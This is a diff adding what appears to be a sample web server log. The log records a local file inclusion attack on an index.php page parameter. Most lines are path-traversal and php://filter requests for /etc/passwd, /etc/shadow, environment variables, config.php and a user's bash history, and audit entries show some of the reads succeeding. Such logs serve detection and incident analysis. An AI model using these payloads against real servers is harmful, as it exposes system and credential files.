@@ -1,0 +1,18 @@
+Feb 15 17:45:01 webserver apache2: 203.0.113.220 - - [15/Feb/2026:17:45:01 +0000] "GET /index.php?page=../../../../etc/passwd HTTP/1.1" 200 1320 "-" "Mozilla/5.0"
+Feb 15 17:45:02 webserver apache2: 203.0.113.220 - - [15/Feb/2026:17:45:02 +0000] "GET /index.php?page=../../../../etc/shadow HTTP/1.1" 500 620 "-" "Mozilla/5.0"
+Feb 15 17:45:03 webserver apache2: 203.0.113.220 - - [15/Feb/2026:17:45:03 +0000] "GET /index.php?page=/proc/self/environ HTTP/1.1" 200 890 "-" "Mozilla/5.0"
+Feb 15 17:45:04 webserver apache2: 203.0.113.220 - - [15/Feb/2026:17:45:04 +0000] "GET /index.php?page=php://filter/convert.base64-encode/resource=config.php HTTP/1.1" 200 1024 "-" "Mozilla/5.0"
+
+Feb 15 17:45:05 webserver apache2: 203.0.113.220 - - [15/Feb/2026:17:45:05 +0000] "GET /index.php?page=../../../../var/log/auth.log HTTP/1.1" 200 1450 "-" "Mozilla/5.0"
+
+Feb 15 17:45:06 webserver apache2: 203.0.113.220 - - [15/Feb/2026:17:45:06 +0000] "GET /index.php?page=../../../../etc/hosts HTTP/1.1" 200 420 "-" "Mozilla/5.0"
+
+Feb 15 17:45:07 webserver apache2: 203.0.113.220 - - [15/Feb/2026:17:45:07 +0000] "GET /index.php?page=../../../../home/john/.bash_history HTTP/1.1" 200 760 "-" "Mozilla/5.0"
+
+Feb 15 17:45:08 webserver audit[8120]: SYSCALL arch=c000003e syscall=2 success=yes exit=3 a0="/etc/passwd" a1=O_RDONLY a2=0
+Feb 15 17:45:08 webserver audit[8120]: PATH item=0 name="/etc/passwd" inode=30122 dev=08:01 mode=0100644 ouid=0 ogid=0
+
+Feb 15 17:45:09 webserver apache2: PHP Warning:  include(../../../../etc/shadow): failed to open stream: Permission denied in /var/www/html/index.php on line 12
+Feb 15 17:45:10 webserver apache2: PHP Warning:  include(): Failed opening '../../../../etc/shadow' for inclusion in /var/www/html/index.php on line 12
+
+Feb 15 17:45:11 webserver kernel: [UFW ALLOW] IN=eth0 SRC=203.0.113.220 DST=192.168.1.20 LEN=60 TOS=0x00 TTL=50 ID=74001 PROTO=TCP SPT=60321 DPT=80
